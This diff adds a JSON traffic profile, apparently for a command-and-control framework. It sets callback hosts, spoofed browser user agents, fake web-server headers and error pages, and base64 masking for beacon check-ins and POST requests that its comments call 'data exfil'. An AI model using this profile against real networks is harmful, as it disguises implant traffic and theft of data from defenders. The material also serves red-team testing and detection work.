@@ -1,0 +1,179 @@
+{
+    "callbacks": [
+        {            
+            "hosts": [
+                "192.168.1.100:443",
+                "192.168.1.101:443",
+                "c2.example.com:8443"
+            ],
+            
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            
+            "server_error": {
+                "http_status": 404,
+                "response": "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>",
+                "headers": {
+                    "Content-Type": "text/html; charset=utf-8",
+                    "Server": "Apache/2.4.41 (Ubuntu)"
+                }
+            },
+            
+            "get": {
+                "_comment": "=== GET: Used for check-in / task request ===",
+                
+                "server_headers": {
+                    "Content-Type": "text/html; charset=utf-8",
+                    "Server": "Apache/2.4.41 (Ubuntu)",
+                    "Cache-Control": "no-store, no-cache, must-revalidate",
+                    "Pragma": "no-cache",
+                    "X-Content-Type-Options": "nosniff",
+                    "X-Frame-Options": "SAMEORIGIN"
+                },
+                
+                "client_headers": {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Connection": "keep-alive",
+                    "Upgrade-Insecure-Requests": "1"
+                },
+                
+                "empty_response": "",
+                
+                "uri": {
+                    "/api/v1/status /api/v1/health /api/v1/ping": {
+                        "_comment": "Multiple URIs with same config (space-separated)",
+                        
+                        "server_output": {
+                            "mask": true,
+                            "format": "base64",
+                            "_format_options": "base64 | base32 | base64url | hex"
+                        },
+                        
+                        "client_output": {
+                            "mask": true,
+                            "format": "base64"
+                        },
+                        
+                        "client_parameters": [
+                            {"client": "web"},
+                            {"version": "1.0"}
+                        ]
+                    }
+                }
+            },
+            
+            "post": {
+                "_comment": "=== POST: Used for task output / data exfil ===",
+                
+                "server_headers": {
+                    "Content-Type": "application/json; charset=utf-8",
+                    "Server": "Apache/2.4.41 (Ubuntu)",
+                    "Cache-Control": "no-store, no-cache, must-revalidate",
+                    "X-Request-ID": "req_abc123def456"
+                },
+                
+                "client_headers": {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "Connection": "keep-alive"
+                },
+                
+                "empty_response": "",
+                
+                "uri": {
+                    "/api/v1/submit /api/v1/upload": {
+                        "server_output": {
+                            "mask": false,
+                            "format": "base64",
+                            "header": "X-Response-Data",
+                            "body": "{\"status\": \"ok\", \"code\": 200}"
+                        },
+                        
+                        "client_output": {
+                            "mask": true,
+                            "format": "base64",
+                            "prepend": "{\"data\": \"",
+                            "append": "\", \"timestamp\": 1704067200}"
+                        }
+                    }
+                }
+            }
+        },
+        
+        {            
+            "hosts": [
+                "backup.example.com:443"
+            ],
+            
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            
+            "server_error": {
+                "http_status": 403,
+                "response": "{\"error\": \"Forbidden\", \"code\": 403}",
+                "headers": {
+                    "Content-Type": "application/json"
+                }
+            },
+            
+            "get": {
+                "server_headers": {
+                    "Content-Type": "application/json",
+                    "Server": "nginx/1.24.0"
+                },
+                
+                "client_headers": {
+                    "Accept": "application/json",
+                    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+                },
+                
+                "empty_response": "{\"tasks\": []}",
+                
+                "uri": {
+                    "/v2/tasks": {
+                        "server_output": {
+                            "mask": true,
+                            "format": "base64url"
+                        },
+                        
+                        "client_output": {
+                            "mask": true,
+                            "format": "base64url",
+                            "parameter": "token"
+                        }
+                    }
+                }
+            },
+            
+            "post": {
+                "server_headers": {
+                    "Content-Type": "application/json",
+                    "Server": "nginx/1.24.0"
+                },
+                
+                "client_headers": {
+                    "Content-Type": "application/json",
+                    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+                },
+                
+                "empty_response": "{\"received\": true}",
+                
+                "uri": {
+                    "/v2/results": {
+                        "server_output": {
+                            "mask": false,
+                            "format": "base64url"
+                        },
+                        
+                        "client_output": {
+                            "mask": true,
+                            "format": "base64url",
+                            "prepend": "{\"payload\": \"",
+                            "append": "\"}"
+                        }
+                    }
+                }
+            }
+        }
+    ]
+}
